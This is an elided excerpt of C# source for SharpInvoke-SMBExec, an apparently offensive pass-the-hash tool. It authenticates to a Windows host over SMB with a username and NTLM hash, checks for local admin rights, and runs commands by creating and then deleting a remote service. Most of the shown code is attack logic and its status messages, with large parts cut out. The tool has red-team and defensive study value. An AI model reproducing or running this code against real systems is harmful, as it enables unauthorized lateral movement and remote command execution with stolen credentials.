...
namespace SharpInvoke_SMBExec
{
    class Program
    {
        ...
        static void run(string Target, string username, string hash)
        {
            //User Set
            ...
            if (!AdminCheck)
            {
                if (debug) { output.Append("AdminCheck is false"); }
                if (!string.IsNullOrEmpty(command))
                {
                    if (debug) { output.Append("String is not empty"); }
                    SMB_execute = true;
                }
            }
            ...
            {
                output.Append(String.Format("Could not connect to {0}", Target));
            }

            if (SMBClient.Connected)
            {
                if (debug) { output.Append(String.Format("Connected to {0}", Target)); }
                ...
                {
                    if (debug) { output.Append(String.Format("Current Stage: {0}", SMBClientStage)); }
                        ...
                        case "NegotiateSMB":
                            {
                                ...
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    ...
                                    {
                                        if (debug) { output.Append("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                ...
                                {
                                    if (debug) { output.Append("Using SMB2"); }
                ...
                if (debug) { output.Append(String.Format("Authenticating to {0}", Target)); }
                ...
                if (ForceSMB1)
                {
                    ...
                    {
                        if (debug) { output.Append("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.Append(String.Format("Unable to authenticate to {0}", Target));
                ...
                if (debug) { output.Append(String.Format("Login Status: {0}", Login_Successful)); }
                if (Login_Successful)
                {
                    ...
                    if (debug) { output.Append(String.Format("Service Name is {0}", SMB_Service)); }
                    byte[] SMB_Service_Length = BitConverter.GetBytes(SMB_Service.Length + 1);

                    if (ComSpec)
                    {
                        if (debug) { output.Append("Appending %COMSPEC% /C"); }
                                ...
                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            ...
                                            {
                                                output.Append(String.Format("{0} is a local administrator on {1}", Output_Username, Target));
                                        ...
                                        {
                                            output.Append(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", Output_Username, Target));
                                            Console.WriteLine(output.ToString());
                                        }
                                        else
                                        {
                                            if (debug)
                                            {
                                                output.Append(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)));
                                                output.Append(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)));
                                            }
                                            output.Append(String.Format("Something went wrong with {0}", Target));
                                            Console.WriteLine(output.ToString());
                                            SMBExec_Failed = true;
                                        }
                                ...
                                case "StartServiceW":
                                    {
                                        ...
                                        {
                                            output.Append(String.Format("Service {0} creation failed on {1}", SMB_Service, Target));
                                            Console.WriteLine(output.ToString());
                                        }
                                        else
                                        {
                                            output.Append("Service Creation Fault Context Mismatch");
                                            Console.WriteLine(output.ToString());
                                        }
                                    }
                                    break;
                                case "DeleteServiceW":
                                    {
                                        ...
                                        {
                                            if (debug) { output.Append(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_Service, Target)); }
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                        {
                                            SMBExec_Failed = true;
                                            if (debug) { output.Append(String.Format("Service {0} failed to start on {1}", SMB_Service, Target)); }
                                        }
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                ...
                                case "CloseServiceHandle":
                                    {
                                        ...
                                        {
                                            if (debug) { output.Append(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                ...
                                case "StartServiceW":
                                    {
                                        ...
                                        {
                                            if (debug) { output.Append(String.Format("Service {0} created on {1}", SMB_Service, Target)); }
                                        ...
                                        {
                                            if (debug) { output.Append(String.Format("Service {0} creation failed on {1}", SMB_Service, Target)); }
                                            SMBExec_Failed = true;
                                        }
                                        else
                                        {
                                            if (debug) { output.Append("Service Creation Fault Context Mismatch."); }
                                            SMBExec_Failed = true;
                                        }
                                    }
                                    break;
                                ...
                                case "DeleteServiceW":
                                    {
                                        ...
                                        {
                                            output.Append(String.Format("Command executed with service {0} on {1}", SMB_Service, Target));
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "02-00-00-00")
                                        {
                                            output.Append(String.Format("Service {0} failed to start on {1}", SMB_Service, Target));
                                        }
                    ...
                    {
                        output.Append("Warning: Service not deleted. Please delete Service \"" + SMB_Service + "\" manually.");
                    }
                }
                SMBClient.Close();
